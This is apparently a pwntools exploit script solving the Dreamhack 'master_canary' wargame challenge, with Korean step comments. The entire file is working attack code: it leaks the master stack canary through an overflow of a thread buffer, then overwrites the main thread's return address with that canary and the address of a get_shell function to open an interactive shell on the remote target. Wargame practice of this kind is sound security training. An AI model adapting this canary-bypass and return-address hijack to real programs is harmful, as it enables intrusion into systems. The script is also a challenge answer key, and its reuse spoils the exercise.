#!/usr/bin/env python3
from pwn import *
#p = process("./master_canary")
p = remote('host3.dreamhack.games', 17024)

elf = ELF("./master_canary", checksec=False)

canary_offset = 0x8e8

# 1. 스레드 생성
p.sendlineafter(b"> ", b"1")

# 2. 마스터 카나리 유출
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Size: ", str(canary_offset + 1).encode())

leak_payload = b"A" * (canary_offset + 1)
p.sendafter(b"Data: ", leak_payload)

p.recvuntil(leak_payload)
canary = u64(b"\x00" + p.recvn(7))
success("canary: {:#x}".format(canary))

# 3. 메인 스레드의 반환 주소 조작
p.sendlineafter(b"> ", b"3")

payload = b"A" * 0x28
payload += p64(canary)
payload += b"B" * 8
payload += p64(elf.symbols["get_shell"])

p.sendafter(b"Leave comment: ", payload)
p.interactive()